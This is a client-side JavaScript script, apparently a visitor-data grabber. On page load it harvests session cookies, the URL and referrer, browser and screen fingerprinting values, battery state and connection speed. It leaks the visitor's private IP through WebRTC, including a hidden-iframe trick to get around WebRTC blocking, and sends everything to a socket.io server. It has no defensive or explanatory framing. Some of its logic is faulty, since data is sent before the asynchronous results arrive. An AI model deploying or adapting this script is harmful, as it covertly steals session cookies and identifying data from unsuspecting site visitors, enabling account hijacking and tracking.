    var socket = io.connect({
      secure: true
    });

    var osver;
    var browserver;
    var privip;
    var batteryinfo;
    var internetspeed;

    //Final Variables
    var final = {
      cookies: document.cookie,
      url: document.URL,
      plugins: document.plugins,
      referrer: document.referrer,
      date: window.Date(),
      privateip: privip,
      internetspeed: null,
      language: navigator.language,
      DNT: navigator.doNotTrack,
      cookieEnabled: navigator.cookieEnabled,
      appCodeName: navigator.appCodeName,
      appName: navigator.appName,
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints,
      platform: navigator.platform,
      vendor: navigator.vendor,
      userAgent: navigator.userAgent,
      sizeScreenW: screen.width,
      sizeScreenH: screen.height,
      sizeDoc: document.width,
      sizeDocH: document.height,
      sizeInW: innerWidth,
      sizeInH: innerHeight,
      sizeAvailW: screen.availWidth,
      sizeAvailH: screen.availHeight,
      scrColorDepth: screen.colorDepth,
      scrPixelDepth: screen.pixelDepth,
      cookiesv2: decodeURIComponent(document.cookie.split(";")),
      batterylevel: null,
      batterychargingstatus: null,
      batterydischarge: null,
      batterychargetime: null,
      osversion: osver,
      browserversion: browserver
    }

    //get the IP addresses associated with an account
    function getIPs(callback) {
      var ip_dups = {};

      //compatibility for firefox and chrome
      var RTCPeerConnection = window.RTCPeerConnection ||
        window.mozRTCPeerConnection ||
        window.webkitRTCPeerConnection;
      var useWebKit = !!window.webkitRTCPeerConnection;

      //bypass naive webrtc blocking using an iframe
      if (!RTCPeerConnection) {
        //NOTE: you need to have an iframe in the page right above the script tag
        //
        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
        //<script>...getIPs called in here...
        //
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection ||
          win.mozRTCPeerConnection ||
          win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
      }

      //minimal requirements for data connection
      var mediaConstraints = {
        optional: [{
          RtpDataChannels: true
        }]
      };

      var servers = {
        iceServers: [{
          urls: "stun:stun.services.mozilla.com"
        }]
      };

      //construct a new RTCPeerConnection
      var pc = new RTCPeerConnection(servers, mediaConstraints);

      function handleCandidate(candidate) {
        //match just the IP address
        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
        var ip_addr = ip_regex.exec(candidate)[1];

        //remove duplicates
        if (ip_dups[ip_addr] === undefined)
          callback(ip_addr);

        ip_dups[ip_addr] = true;
      }

      //listen for candidate events
      pc.onicecandidate = function(ice) {

        //skip non-candidate events
        if (ice.candidate)
          handleCandidate(ice.candidate.candidate);
      };

      //create a bogus data channel
      pc.createDataChannel("");

      //create an offer sdp
      pc.createOffer(function(result) {

        //trigger the stun server request
        pc.setLocalDescription(result, function() {}, function() {});

      }, function() {});

      //wait for a while to let everything done
      setTimeout(function() {
        //read candidate info from local description
        var lines = pc.localDescription.sdp.split('\n');

        lines.forEach(function(line) {
          if (line.indexOf('a=candidate:') === 0)
            handleCandidate(line);
        });
      }, 1000);

    }

    (function() {
      getIPs(function(ip){final.privateip = ip})
      var imageAddr = "https://upload.wikimedia.org/wikipedia/commons/2/2d/Snake_River_%285mb%29.jpg";
      var downloadSize = 5245329; //bytes
      var oProgress = document.getElementById("speed");

      function ShowProgressMessage(msg) {
        if (console) {
          if (typeof msg == "string") {
            console.log(msg);
          } else {
            for (var i = 0; i < msg.length; i++) {
              console.log(msg[i]);
            }
          }
        }

        if (oProgress) {
          var actualHTML = (typeof msg == "string") ? msg : msg.join(" ");
          oProgress.innerHTML = actualHTML;
        }
      }

      function InitiateSpeedDetection() {
        window.setTimeout(MeasureConnectionSpeed, 1);
      };

      if (window.addEventListener) {
        window.addEventListener('load', InitiateSpeedDetection, false);
      } else if (window.attachEvent) {
        window.attachEvent('onload', InitiateSpeedDetection);
      }

      function MeasureConnectionSpeed() {
        var startTime, endTime;
        var download = new Image();
        download.onload = function() {
          endTime = (new Date()).getTime();
          showResults();
        }

        download.onerror = function(err, msg) {
          ShowProgressMessage("Invalid image, or error downloading");
        }

        startTime = (new Date()).getTime();
        var cacheBuster = "?nnn=" + startTime;
        download.src = imageAddr + cacheBuster;

        function showResults() {
          var duration = (endTime - startTime) / 1000;
          var bitsLoaded = downloadSize * 8;
          var speedBps = (bitsLoaded / duration).toFixed(2);
          var speedKbps = (speedBps / 1024).toFixed(2);
          var speedMbps = (speedKbps / 1024).toFixed(2);
          internetspeed = final.internetspeed
          ShowProgressMessage([
            "<b>Download Speed:</b>",
            speedKbps + " kbps",
          ]);
        }
      }
      MeasureConnectionSpeed();
      //insert IP addresses into the page


      var parser = new UAParser()
      final.osver = parser.getOS().name + ' ' + parser.getOS().version
      final.browserver = parser.getBrowser().name + ' ' + parser.getBrowser().version

      //Battery Info
      navigator.getBattery().then(function(battery) {
        batteryinfo = battery
        final.batterylevel = battery.level
        final.batterychargingstatus = battery.charging
        final.batterydischarge = battery.dischargingTime
        final.batterychargetime = battery.chargingTime
      })
    }());



    socket.emit('sending-info', final)
